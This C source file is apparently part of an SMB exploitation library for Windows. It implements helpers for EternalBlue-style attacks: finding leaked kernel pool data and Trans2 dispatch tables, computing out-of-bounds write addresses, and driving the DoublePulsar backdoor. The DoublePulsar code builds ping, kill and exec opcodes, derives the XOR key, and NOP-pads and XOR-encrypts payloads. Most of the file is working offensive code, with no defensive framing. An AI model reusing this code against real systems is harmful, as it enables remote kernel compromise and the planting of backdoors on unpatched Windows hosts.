#include "smb.h"
#pragma intrinsic(memset, memcpy)
#ifndef SMB_MACROS

#define SMB_COM_NEGOTIATE				0x72
#define SMB_COM_SESSION_SETUP_ANDX		0x73
#define SMB_COM_TREE_CONNECT			0x75
#define SMB_COM_TRANS					0x25
#define SMB_COM_TRANS_SECONDARY			0x26
#define SMB_COM_TRANS2					0x32
#define SMB_COM_TRANS2_SECONDARY
#define SMB_COM_NT_TRANS				0xa0
#define SMB_COM_NT_CREATE_ANDX			0xa2

#endif

#ifndef EXEC_ALLOC
#define EXEC_ALLOC
#endif // !EXEC_ALLOC

#ifndef SMB_UTILS_DISABLED_WARNINGS
#define SMB_UTILS_DISABLED_WARNINGS 4244 26451 6305

#endif // !SMB_UTILS_DISABLED_WARNINGS

#pragma warning(push)
#pragma warning(disable : SMB_UTILS_DISABLED_WARNINGS)
//#pragma warning(disable : 4244)

BOOL __cdecl __memcmp(const void* a, const void* b, DWORD size)
{
	register PBYTE pa = MAKEPBYTE(a), pb = MAKEPBYTE(b);
	while (size--)
		if (*(pa++) != *(pb++))
			return FALSE;
	return TRUE;
}

BOOL find_memory_pattern(BUFFER IN* bws, PANYPOINTER IN OUT result, const void* IN pattern, DWORD IN patternsize)
{
	DWORD offset = 0;
	BOOL ret = FALSE;

	result->pvpointer = bws->pbdata;
	for (offset = 0; offset < (bws->dwsize - patternsize); offset++)
	{
		if (cmp(result->pbpointer + offset, pattern, patternsize))
		{
			ret = TRUE;
			result->address += offset;
			break;
		}
	}

	return ret;
}

VOID update_smb_info(smb_info* info, BUFFER* IN newpacket)
{
	DWORD* dwnetbios = (DWORD*)newpacket->pbdata, * dwtagfrag = NULL, * dwtagfree = NULL, * dwtaglstr = NULL;
	WORD* nbtsize = (WORD*)(newpacket->pbdata + 2);
	PSMB_HEADER smb = MAKEPSMB(newpacket->pbdata + sizeof(DWORD));
	PREQ_NT_CREATE_ANDX ntcreatereq = NULL;
	PRESP_NT_CREATE_ANDX ntcreateresp = NULL;
	PREQ_TREE_CONNECT_ANDX treeandxreq = NULL;
	PREQ_SESSIONSETUP_ANDX sessionsetupreq = NULL;
	ANYPOINTER ptr = { 0 };
	static BUFFER varbuf;


	if (!cmp(smb->Protocol, "\xFFSMB", sizeof(smb->Protocol)))
	{
		errmsg(__FUNCSIG__, __LINE__, STATUS_FAIL);
		return;
	}

	RtlZeroMemory(info->headerinfo, 32U);
	RtlCopyMemory(info->headerinfo, newpacket->pbdata + sizeof(DWORD), 32);

	ntcreatereq = (PREQ_NT_CREATE_ANDX)(newpacket->pbdata + SMB_PARAM_OFFSET);
	ntcreateresp = (PRESP_NT_CREATE_ANDX)(newpacket->pbdata + SMB_PARAM_OFFSET);
	treeandxreq = (PREQ_TREE_CONNECT_ANDX)(newpacket->pbdata + SMB_PARAM_OFFSET);
	sessionsetupreq = (PREQ_SESSIONSETUP_ANDX)(newpacket->pbdata + SMB_PARAM_OFFSET);

	RtlCopyMemory(&info->pid, &smb->Pid, 2);
	RtlCopyMemory(&info->uid, &smb->Uid, 2);
	RtlCopyMemory(&info->tid, &smb->Tid, 2);
	RtlCopyMemory(&info->mid, &smb->Mid, 2);

	bwsalloc(&varbuf, sizeof(DWORD) * 0x80);
	dwtagfrag = ((DWORD*)(varbuf.pbdata));
	dwtaglstr = dwtagfree = dwtagfrag;
	dwtagfree++;
	dwtaglstr = dwtagfree;
	dwtaglstr++;

	if (smb->Status.NtStatus & STATUS_FAIL)
		PutUlong(&info->srv_last_error, smb->Status.NtStatus);

	switch (smb->Command)
	{
	case SMB_COM_SESSION_SETUP_ANDX:
		if (!(smb->Flags & SMB_FLAGS_REPLY))
		{
			info->AndxCommand = sessionsetupreq->andx.AndxCommand;
			info->AndxOffset = sessionsetupreq->andx.AndxOffset;
		}



	case SMB_COM_TREE_CONNECT:			//if command is SMB_COM_TREE_CONNECT and isnt a reply copy the unc path
		if (!(smb->Flags & SMB_FLAGS_REPLY))
		{
			info->AndxCommand = treeandxreq->Andx.AndxCommand;
			info->AndxOffset = treeandxreq->Andx.AndxOffset;
			do
			{
				if (!find_memory_pattern(newpacket, &ptr, L"IPC$", sizeof(WCHAR) * 3))
					break;

				RtlZeroMemory(&ptr, sizeof(ptr));

				if (!find_memory_pattern(newpacket, &ptr, L"\\\\", sizeof(WCHAR) * 2))
					break;

				InitUnicodeString(ptr.pwpointer, &info->tree_connection);

				RtlZeroMemory(&ptr, sizeof(ptr));

				if (!find_memory_pattern(newpacket, &ptr, "?????", 5))
					break;

				InitString(ptr.ppointer, &info->tree_connect_andx_svc);
			} while (FALSE);
		}
		break;
	case SMB_COM_NT_CREATE_ANDX:
		if (!(smb->Flags & SMB_FLAGS_REPLY))//request
		{
			info->AndxCommand = ntcreatereq->AndxCommand;
			info->AndxOffset = ntcreatereq->AndxOffset;
			break;
		}
		else//reply
		{
			info->AndxCommand = ntcreateresp->AndxCommand;
			RtlCopyMemory(&info->AndxOffset, &ntcreateresp->AndxOffset, sizeof(WORD));
			if (GetUshort(&ntcreateresp->Fid) & 0xFFFF)
				RtlCopyMemory(&info->fid, &ntcreateresp->Fid, sizeof(WORD));
			break;
		}

		//	*(&info->AndxCommand) = *(&ntcreatereq->AndxCommand);
		//	*(&info->AndxOffset) = *(&ntcreatereq->AndxOffset);
		//	if (info->fid & 0xFFFF)
		//		RtlCopyMemory(&info->fid, &ntcreateresp->Fid, 2);

	case SMB_COM_TRANS:
		*dwtagfrag = GetUlong("Frag");
		*dwtagfree = GetUlong("Free");
		*dwtaglstr = GetUlong("LStr");

		if (!(smb->Flags & SMB_FLAGS_REPLY))
			break;
		if (!find_memory_pattern(newpacket, &ptr, dwtagfrag, sizeof(DWORD)))
			*dwtagfrag = byteswap32(GetUlong("Frag"));

		if (!find_memory_pattern(newpacket, &ptr, "Frag", 4))
			if (!find_memory_pattern(newpacket, &ptr, "LStr", 4))
				break;
		if (find_memory_pattern(newpacket, &ptr, "Frag", 4))
			break;

	default:
		//RtlZeroMemory(&info->fid, 2);
		break;
	}
	bwsfree(&varbuf);
}

void csprng(PBYTE buffer, DWORD size)
{
	HCRYPTPROV hp = 0;
	if (!CryptAcquireContext(&hp, NULL, NULL, PROV_RSA_FULL, 0))
		errmsg(__FUNCSIG__, __LINE__ - 1, GetLastError());
	if (!CryptGenRandom(hp, size, buffer))
		errmsg(__FUNCSIG__, __LINE__ - 1, GetLastError());
	CryptReleaseContext(hp, 0);
}

unsigned int random(void)
{
	ULARGE_INTEGER out = { 0 };
	WORD wresult = 0;
	BYTE randbytes[0x10] = { 0 };
	ULARGE_INTEGER tickcnt = { 0 };

	csprng(randbytes, sizeof(randbytes));

	if (!GetUlongPtr(randbytes))
		return 0;

	RtlCopyMemory(&out, randbytes, sizeof(out));
	RtlZeroMemory(randbytes, sizeof(randbytes));

	tickcnt.QuadPart = GetTickCount64();

	if (tickcnt.QuadPart % 0x1000)
		PutUshort(&wresult, GetUshort(&out.HighPart));
	else if (!(tickcnt.QuadPart % 0x1000))
		PutUshort(&wresult, GetUshort(&out.LowPart));
	else
		PutUshort(&wresult, GetUshort(&out.QuadPart));

	return MAKEUNSIGNED(wresult);
}

//if the parameter passed contains the leak data
//this function will return the fe's offset from 
//begining of the buffer
DWORD __stdcall FindLeakedTrans2DispatchTable(BUFFER IN* bws)
{
	static ANYPOINTER base, any;
	static BYTE matchdata[0x10];
	static ULARGE_INTEGER offset;

	PutUlongPtr(&base, GetUlongPtr(&bws->pbdata));
	RtlFillMemory(matchdata, sizeof(matchdata), 0xFE);

	if (!find_memory_pattern(bws, &any, matchdata, sizeof(matchdata)))
		return 0;

	offset.QuadPart = (any.address - base.address);
	RtlZeroMemory(matchdata, sizeof(matchdata));

	return offset.LowPart;
}

DWORD __stdcall GetDoublePulsarStatusCode(BUFFER* IN bws, BUFFER IN* request)
{
	DWORD status = 0;
	PSMB_HEADER smbresp = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET), smbreq = MAKEPSMB(request->pbdata + SMB_PARAM_OFFSET);
	PRESP_TRANSACTION2 trans2resp = (PRESP_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);
	PREQ_TRANSACTION2 trans2req = (PREQ_TRANSACTION2)(request->pbdata + SMB_PARAM_OFFSET);

	status = (DWORD)(GetUshort(&smbresp->Mid) - GetUshort(&smbreq->Mid));
	status &= 0xFFUL;

	return status;
}

DWORD __stdcall GetDoublePulsarOpCode(BUFFER* IN bws)
{
	DWORD opcode = 0, t = 0;
	PREQ_TRANSACTION2 trans2 = (PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUlong(&t, GetUlong(&trans2->Timeout));
	opcode = ((t)+(t >> 8) + (t >> 16) + (t >> 24));

	return (opcode & 0xFF);
}

BOOL __stdcall GenerateDoublePulsarOpcodePacket(BUFFER* IN OUT bws, BYTE opcode)
{
	DWORD op = 0, k = 0, t = 0;
	PREQ_TRANSACTION2 trans2 = NULL;
	PSMB_HEADER smb = NULL;

	op = opcode;
	//PutUnsigned(&k, random());
	csprng(MAKEPBYTE(&k), sizeof(k));
	t = 0xFF & (op - ((k & 0xFFFF00) >> 16) - (0xFFFF & (k & 0xFF00) >> 8)) | k & 0xFFFF00;


	smb = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans2 = (PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);
	PutUlong(&trans2->Timeout, GetUlong(&t));

	if (!cmp(smb->Protocol, "\xFFSMB", 4))
		return FALSE;
	else
		return TRUE;
}

DWORD __stdcall GetDoublePulsarXorKey(BUFFER* IN bws)
{
	ULONGLONG s = 0;
	ULARGE_INTEGER x = { 0 };
	PSMB_HEADER smb = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);

	s = byteswap64(GetUlonglong(smb->SecuritySignature));
	s = GetUlonglong(smb->SecuritySignature);

	x.QuadPart = (2 * s ^ (((s & 0xFF00 | (s << 16)) << 8) | (((s >> 16) | s & 0xFF0000) >> 8)));

	return (x.LowPart & 0xFFFFFFFF);
}

ULONG_PTR __stdcall GetOOBWriteAddress(BUFFER* IN packet)
{
	PREQ_TRANSACTION_SECONDARY transsecondary = NULL;
	PSMB_HEADER h = NULL;
	static WORD datacount, dataoffset, datadisplacement, paramcount, paramoffset;
	ANYPOINTER address_of_address = { 0 };

	h = MAKEPSMB(packet->pbdata + SMB_HEADER_OFFSET);
	transsecondary = (PREQ_TRANSACTION_SECONDARY)(packet->pbdata + SMB_PARAM_OFFSET);

	if (h->Command != SMB_COM_TRANS_SECONDARY)
		return NULL;

	PutUshort(&datacount, GetUshort(&transsecondary->DataCount));
	PutUshort(&dataoffset, GetUshort(&transsecondary->DataOffset));
	PutUshort(&paramcount, GetUshort(&transsecondary->ParameterCount));
	PutUshort(&paramoffset, GetUshort(&transsecondary->ParameterOffset));

	if (datacount < 8)
		return 0;

	address_of_address.pvpointer = (MAKEPBYTE(h) + GetUshort(&dataoffset));
	return GetUlongPtr(address_of_address.pbpointer);
}

PBYTE GenerateDoublePulsarTrans2SessionSetupParameters(BUFFER* IN OUT parameters, DWORD IN opcode, DWORD* IN OPTIONAL datalength, DWORD IN OPTIONAL xorkey, PSMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST last_trans2_session_setup_req)
{
	SMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST* previous = NULL;
	PTRANS2_SESSION_SETUP_PARAMETERS session_setup_parameters = NULL;
	DWORD paramsize = 0, i = 0, dwords = 0, * dwptr = NULL, dwstatus[2] = { 0 };
	if ((opcode & DOPU_PING_OPCODE) == DOPU_PING_OPCODE)
	{
		paramsize = 12;
		RtlZeroMemory(parameters, sizeof(BUFFER));
		bwsalloc(parameters, paramsize);
		RtlFillMemory(parameters->pbdata, MAKESIZET(parameters->dwsize), 0);
	}
	else if ((opcode & DOPU_KILL_OPCODE) == DOPU_KILL_OPCODE)
	{
		paramsize = 12;
		RtlZeroMemory(parameters, sizeof(BUFFER));
		bwsalloc(parameters, paramsize);
		RtlFillMemory(parameters->pbdata, MAKESIZET(parameters->dwsize), 0);
	}
	else if ((opcode & DOPU_EXEC_OPCODE) == DOPU_EXEC_OPCODE)
	{
		if (isnull(last_trans2_session_setup_req) || isnull(datalength))
		{
			PutUlong(dwstatus, STATUS_INVALID_PARAMETER);
			SetLastError(GetUlong(dwstatus));
			errmsg(__FUNCSIG__, __LINE__, GetUlong(dwstatus));
			return NULL;
		}

		PutUlong(dwstatus + 1, 1);
		AllocateSmbLibLastTrans2SessionSetupRequestStructure(&previous, GetUlong(dwstatus + 1));
		RtlCopyMemory(previous, last_trans2_session_setup_req, sizeof(SMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST));

		if (
			(isnull(previous->NetbiosSize)) ||
			(isnull(previous->Smb)) ||
			(isnull(previous->Trans2)) ||
			(isnull(previous->Trans2SessionSetup))
			)
		{
			FreeSmbLibLastTrans2SessionSetupRequestStructure(&previous);
			PutUlong(dwstatus, STATUS_INVALID_PARAMETER);
			SetLastError(GetUlong(dwstatus));
			errmsg(__FUNCSIG__, __LINE__, GetUlong(dwstatus));
			return NULL;
		}



		paramsize = sizeof(previous->Trans2SessionSetup->SessionSetupParameters);
		PutUlong(&dwords, (paramsize / sizeof(DWORD)));
		bwsalloc(parameters, paramsize);

		session_setup_parameters = ((PTRANS2_SESSION_SETUP_PARAMETERS)(parameters->pbdata));
		PutUlong(session_setup_parameters->ParameterDoublewords, 0x4200);
		PutUlong(session_setup_parameters->ParameterDoublewords + 1, GetUlong(datalength));

		
		PutUlong(session_setup_parameters->ParameterDoublewords + 2, 0);

	}
	return parameters->pbdata;
}

//pads double pulsar payload to a multiple of 0x1000 or 4096
PBYTE PadDoPuPayloadToProperSize(BUFFER IN OUT* payload)
{
	unsigned int padbyte = 0x90;
	static BUFFER tmp;
	static ANYPOINTER offset;
	static DWORD size;

	if (!payload->dwsize)
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		return NULL;
	}

	if (payload->dwsize < 0x1000)
		size = 0x1000;// - payload->dwsize;
	else if ((payload->dwsize > 0x1000) && (payload->dwsize % 0x1000))
		size = payload->dwsize + (payload->dwsize % 0x1000);
	else
		errmsg(__FUNCSIG__, __LINE__, NT_STATUS_INVALID_VIEW_SIZE);
	if (!size)
		return NULL;

	bwsalloc(&tmp, size);
	offset.address += payload->dwsize;//PutUlong(&offset.address, payload->dwsize);
	cpy(tmp.pbdata, payload->pbdata, payload->dwsize);

	RtlFillMemory(tmp.pbdata + offset.address, MAKESIZET(tmp.dwsize - payload->dwsize), padbyte);
	bwsfree(payload);

	bwsalloc(payload, tmp.dwsize);
	cpy(payload->pbdata, tmp.pbdata, tmp.dwsize);
	bwsfree(&tmp);
	
	return payload->pbdata;
}

BOOL __stdcall XorEncryptPayload(BUFFER IN OUT* payload, DWORD IN xorkey)
{
	static BUFFER tmp;
	DWORD doublewordsize = 0, remainder = 0, * dwptr = NULL, i = 0;

	if (isnull(payload) || !GetUlong(&xorkey))
		return FALSE;

	if (payload->dwsize % 0x1000)
		return FALSE;

	doublewordsize = (payload->dwsize / sizeof(DWORD));
	dwptr = MAKEPDWORD(payload->pbdata);

	for (i = 0; i < doublewordsize; i++)
		dwptr[i] ^= xorkey;

	return TRUE;
}


//#pragma warning(push)
#pragma warning(disable : 6385)
#pragma warning(disable : 6386)

ULONG_PTR** __stdcall GetAllOOBReadAddressesFromMultiRequest(BUFFER* IN packet, DWORD IN smbcount)
{
	BUFFER tmp = { 0 };
	ANYPOINTER addr = { NULL }, * racebaseaddr = (PANYPOINTER)(&packet->pbdata), * baseaddr = NULL;
	PSMB_HEADER* smbs = NULL;
	PREQ_TRANSACTION_SECONDARY* trans = NULL;
	ULONG_PTR** addresses = NULL;
	SIZE_T smbptrarraysize = (SIZE_T)(smbcount * sizeof(PSMB_HEADER)),
		transptrarraysize = (SIZE_T)(smbcount * sizeof(PREQ_TRANSACTION_SECONDARY));
	HANDLE heap = GetProcessHeap();
	DWORD i = 0;

	smbs = (SMB_HEADER**)HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, smbptrarraysize);
	trans = (REQ_TRANSACTION_SECONDARY**)HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, transptrarraysize);
	baseaddr = (PANYPOINTER)HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, sizeof(ANYPOINTER) * (SIZE_T)smbcount);

	if (isnull(smbs) || isnull(trans) || isnull(baseaddr))
		return NULL;

	RtlCopyMemory(&tmp, packet, sizeof(tmp));

	for (i = 0; i < smbcount; i++)
	{
		if (!find_memory_pattern(&tmp, baseaddr + i, "\xFFSMB", 4))
			break;
		RtlCopyMemory(&tmp, packet, sizeof(tmp));
		tmp.pbdata = (baseaddr[i].pbpointer + SMB_HEADER_OFFSET);
		tmp.dwsize -= (DWORD)(baseaddr[i].address - racebaseaddr->address);

		smbs[i] = MAKEPSMB(baseaddr[i].pbpointer);
	}

	RtlZeroMemory(&tmp, sizeof(tmp));

	for (i = 0; i < smbcount; i++)
	{
		baseaddr[i].address -= SMB_HEADER_OFFSET;
		trans[i] = (PREQ_TRANSACTION_SECONDARY)(baseaddr[i].pbpointer + SMB_PARAM_OFFSET);
	}

	RtlZeroMemory(baseaddr, sizeof(ANYPOINTER) * (SIZE_T)(smbcount));

	addresses = (ULONG_PTR**)HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, sizeof(ULONG_PTR) * (SIZE_T)(smbcount));

	if (isnull(addresses))
	{
		HeapFree(heap, 0, trans);
		HeapFree(heap, 0, smbs);
		HeapFree(heap, 0, baseaddr);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return NULL;
	}

	for (i = 0; i < smbcount; i++)
	{
		baseaddr[i].pvpointer = (MAKEPBYTE(smbs[i]) + trans[i]->DataOffset);
		addresses[i] = baseaddr[i].paddress;
	}

	HeapFree(heap, 0, trans);
	HeapFree(heap, 0, smbs);
	HeapFree(heap, 0, baseaddr);
	return addresses;
}

DWORD __stdcall FindLeakedDataFragTag(BUFFER IN* packet)
{
	static BUFFER tmp;
	static ANYPOINTER fragtag, * baseaddress;
	static ULONG_PTR offset, worawitoffset;
	PRESP_TRANSACTION trans = NULL;
	PSMB_HEADER h = NULL;

	if (isnull(packet) || isnull(packet->pbdata))
		return 0;

	baseaddress = (PANYPOINTER)(&packet->pbdata);

	RtlCopyMemory(&tmp, packet, sizeof(tmp));
	trans = (PRESP_TRANSACTION)(packet->pbdata + SMB_PARAM_OFFSET);
	h = MAKEPSMB(packet->pbdata + SMB_HEADER_OFFSET);

	//adjust pointer to point to trans data
	tmp.pbdata = (MAKEPBYTE(h) + trans->DataOffset);
	tmp.dwsize -= (DWORD)(GetUlongPtr(&tmp.pbdata) - baseaddress->address);

	if (!find_memory_pattern(&tmp, &fragtag, "Frag", 4))
		return 0;

	offset = (fragtag.address - baseaddress->address);
	worawitoffset = (fragtag.address - GetUlongPtr(&tmp.pbdata));

	return ((DWORD)(worawitoffset & 0xFFFFFFFFUL));
}

DWORD __stdcall FindLeadedDataLStrTag(BUFFER IN* packet)
{
	static BUFFER tmp;
	static ANYPOINTER fragtag, * baseaddress;
	static ULONG_PTR offset, worawitoffset;
	PRESP_TRANSACTION trans = NULL;
	PSMB_HEADER h = NULL;

	if (isnull(packet) || isnull(packet->pbdata))
		return 0;

	baseaddress = (PANYPOINTER)(&packet->pbdata);

	RtlCopyMemory(&tmp, packet, sizeof(tmp));
	trans = (PRESP_TRANSACTION)(packet->pbdata + SMB_PARAM_OFFSET);
	h = MAKEPSMB(packet->pbdata + SMB_HEADER_OFFSET);

	//adjust pointer to point to address of trans data
	tmp.pbdata = (MAKEPBYTE(h) + trans->DataOffset);
	tmp.dwsize -= (DWORD)(GetUlongPtr(&tmp.pbdata) - baseaddress->address);

	if (!find_memory_pattern(&tmp, &fragtag, "LStr", 4))
		return 0;

	offset = (fragtag.address - baseaddress->address);
	worawitoffset = (fragtag.address - GetUlongPtr(&tmp.pbdata));

	return ((DWORD)(GetUlongPtr(&worawitoffset) & 0xFFFFFFFF));
}

BOOL AllocateSmbLibLastTrans2SessionSetupRequestStructure(SMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST** IN OUT pointertostructpointer, DWORD IN numbertoallocate)
{
	SMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST* data = NULL; 
	data = ((SMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST*)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, sizeof(SMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST) * ((SIZE_T)(numbertoallocate)))));
	if (isnull(data))
	{
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	*pointertostructpointer = data;
	PutUlongPtr(&data, NULL);

	return TRUE;
}

BOOL FreeSmbLibLastTrans2SessionSetupRequestStructure(SMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST** IN OUT pointertostructpointer)
{
	if (isnull(pointertostructpointer) || isnull(*pointertostructpointer))
	{
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	if (!HeapFree(GetProcessHeap(), 0, *pointertostructpointer))
	{
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	PutUlongPtr(pointertostructpointer, NULL);
	return TRUE;
}


void bwsalloc(BUFFER OUT* bws, DWORD IN size)
{
	SIZE_T siz = size;
	*bws = { 0 };
	bws->dwsize += size;
#ifdef EXEC_ALLOC
	bws->pbdata = MAKEPBYTE(VirtualAlloc(NULL, siz, MEM_COMMIT, PAGE_EXECUTE_READWRITE));
#else
	bws->pbdata = MAKEPBYTE(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, siz));
#endif // EXEC_ALLOC

	if (isnull(bws->pbdata))
	{
		errmsg(__FUNCSIG__, __LINE__, GetLastError() | STATUS_NO_MEMORY);
		return;
	}

	RtlZeroMemory(bws->pbdata, siz);
	return;
}

void bwsfree(BUFFER IN* bws)
{
#ifdef EXEC_ALLOC
	if (notnull(bws->pbdata))
		if (!VirtualFree(bws->pbdata, 0, MEM_RELEASE))
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
#else
	if (notnull(bws->pbdata))
		if (!HeapFree(GetProcessHeap(), 0, bws->pbdata))
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
#endif // EXEC_ALLOC
	RtlZeroMemory(bws, sizeof(BUFFER));
	return;
}

BOOL bwscat(BUFFER IN OUT* dst, BUFFER IN* src)
{
	BUFFER tmp[1] = { 0 };
	RtlZeroMemory(tmp, sizeof(tmp));
	
	if (isnull(dst) || isnull(src) || isnull(dst->pbdata) || (!(GetUlong(&dst->dwsize) & 0xFFFFFFFF)))
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		dbgprint("[%S] function call with invalid parameters occurred in src file \"%S\"\n", __FUNCTION__, __FILE__);
		return FALSE;
	}

	//append src data to the end of tmp buffer after we allocate tmp to be dst's size + src's size:
	bwsalloc(tmp, dst->dwsize + src->dwsize);
	cpy(tmp->pbdata, dst->pbdata, dst->dwsize);
	cpy(tmp->pbdata + dst->dwsize, src->pbdata, src->dwsize);

	//free old dst buffer and allocate new dst buffer with tmp buffer's size:
	bwsfree(dst);
	bwsalloc(dst, tmp->dwsize);
	
	//copy data from tmp to dst buffer and free tmp buffer 
	cpy(dst->pbdata, tmp->pbdata, dst->dwsize);
	bwsfree(tmp);

	return TRUE;
}

BUFFER* OUT bwsnew(DWORD IN count)
{
	BUFFER* newbuffer = ((BUFFER*)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, sizeof(BUFFER))));

	if (isnull(newbuffer))
	{
		SetLastError(((GetLastError() & 0xC0000001) ? GetLastError() : STATUS_NO_MEMORY));
		return NULL;
	}

	return newbuffer;
}

BOOL bwsdelete(BUFFER** IN OUT bws)
{
	BOOL success = FALSE;

	if (isnull(bws) || isnull(*bws))
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		dbgprint("[%S] function call with invalid parameters occurred in src file \"%S\"\n", __FUNCTION__, __FILE__);
		return FALSE;
	}

	success = HeapFree(GetProcessHeap(), 0, *bws);
	*bws = NULL;
	return success;
}

BOOL bwsallocateandcopy(BUFFER IN OUT* bws, const void IN* src, DWORD IN size)
{
	if (isnull(bws) || isnull(src) || (!(GetUlong(&size) & 0xFFFFFFFF)))
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		dbgprint("[%S] function call with invalid parameters occurred in src file \"%S\"\n", __FUNCTION__, __FILE__);
		return FALSE;
	}

	bwsalloc(bws, size);
	cpy(bws->pbdata, src, size);
	return TRUE;
}


void __stdcall FreeRequestLinkedListBuffers(RequestPacketLinkedList* IN OUT liststart, DWORD* IN ListElementCount)
{
	void* (__cdecl * alloc)(size_t) = NULL;
	void(__cdecl * afree)(void*) = NULL;
	alloc = (&malloc);
	afree = (&free);

	DWORD i = 0, j = 0;

	for (PutUlong(&j, 0); j < GetUlong(ListElementCount); j++)
	{
		if (notnull(liststart->ThisSmb))
			liststart->ThisSmb = NULL;

		if (notnull(liststart->ThisPacket.pbdata))
			bwsfree(&liststart->ThisPacket);

		if (notnull(liststart->NextEntry))
			liststart = liststart->NextEntry;
		else
			break;
	}

	return;
}

void __stdcall FreeResponseLinkedListBuffers(ResponsePacketLinkedList* IN OUT liststart, DWORD* IN ListElementCount)
{
	DWORD i = 0, j = 0;
	for (PutUlong(&i, 0); i < GetUlong(ListElementCount); i++)
	{
		if (notnull(liststart->ThisPacket.pbdata))
			bwsfree(&liststart->ThisPacket);
		if (notnull(liststart->ThisSmb))
			liststart->ThisSmb = NULL;
		if (notnull(liststart->NextEntry))
			liststart = liststart->NextEntry;
		else
			break;
	}
	return;
}

void __stdcall FreeLeakdataLinkedListBuffers(LeakedDataLinkedList* IN OUT liststart, DWORD* IN ListElementCount)
{
	DWORD dw[0x2] = { 0 }, * ii = (&dw[0]), & i = dw[0];
	for (PutUlong(ii, 0); GetUlong(ii) < GetUlong(ListElementCount); i++)
	{
		if (notnull(liststart->KrnlLeakResponse.pbdata))
			bwsfree(&liststart->KrnlLeakResponse);
		else
			continue;

		if (notnull(liststart->ResponseHeader))
			liststart->ResponseHeader = NULL;

		if (notnull(liststart->NextEntry))
			liststart = liststart->NextEntry;
		else
			break;
	}
	return;
}

void __stdcall FreeRequestLinkedListSingleEntry(RequestPacketLinkedList* IN OUT entrypointer)
{
	do {
		if (isnull(entrypointer))
			break;

		if (isnull(entrypointer->ThisPacket.pbdata))
		{
			break;
		}
		else if (notnull(entrypointer->ThisPacket.pbdata))
		{
			bwsfree(&entrypointer->ThisPacket);
			entrypointer->ThisNetbiosSize = NULL,
				entrypointer->ThisSmb = NULL;
			break;
		}

	} while (FALSE);
	return;
}

void __stdcall FreeResponseLinkedListSingleEntry(ResponsePacketLinkedList* IN OUT entry)
{
	while ((1 | 2 | 4 | 8) % 2)
	{
		if (isnull(entry))
			break;
		if (notnull(entry->ThisNetbiosSize) && notnull(entry->ThisSmb))
		{
			entry->ThisNetbiosSize = NULL;
			entry->ThisSmb = NULL;
		}
		if (notnull(entry->ThisPacket.pbdata))
			bwsfree(&entry->ThisPacket);
		break;
	}
}


void __stdcall InitString(PCSTR IN cstr, STRING* IN OUT str)
{
	SIZE_T length = strlen(cstr), size = strlen(cstr) + sizeof(char);

	RtlZeroMemory(str, sizeof(STRING));

	str->Length = LOWORD(length);
	str->MaximumLength = LOWORD(size);
	str->Buffer = (PSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, size);

	if (isnull(str->Buffer))
	{
#ifdef _DEBUG
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
#endif // _DEBUG
		return;
	}

	RtlZeroMemory(str->Buffer, size);
	RtlCopyMemory(str->Buffer, cstr, length);
	return;
}

void __stdcall FreeString(STRING* IN OUT str)
{
	if (isnull(str->Buffer))
		return;
	if (!HeapFree(GetProcessHeap(), 0, str->Buffer))
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
	RtlZeroMemory(str, sizeof(STRING));
}

void __stdcall InitUnicodeString(PCWSTR IN cstr, UNICODE_STRING* IN OUT str)
{
	SIZE_T length = wcslen(cstr) * 2, size = ((wcslen(cstr) * sizeof(wchar_t)) + sizeof(wchar_t));

	RtlZeroMemory(str, sizeof(UNICODE_STRING));

	str->Length = LOWORD(length);
	str->MaximumLength = LOWORD(size);
	str->Buffer = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, size);

	if (isnull(str->Buffer))
	{
#ifdef _DEBUG
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
#endif // _DEBUG
		return;
	}

	RtlZeroMemory(str->Buffer, size);
	RtlCopyMemory(str->Buffer, cstr, length);
}

void __stdcall FreeUnicodeString(UNICODE_STRING* IN OUT str)
{
	if (isnull(str->Buffer))
		return;
	if (!HeapFree(GetProcessHeap(), 0, str->Buffer))
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
	RtlZeroMemory(str, sizeof(UNICODE_STRING));
}

void __stdcall ConvertStringToUnicode(STRING* IN s, UNICODE_STRING* IN OUT u)
{
#pragma warning(push)
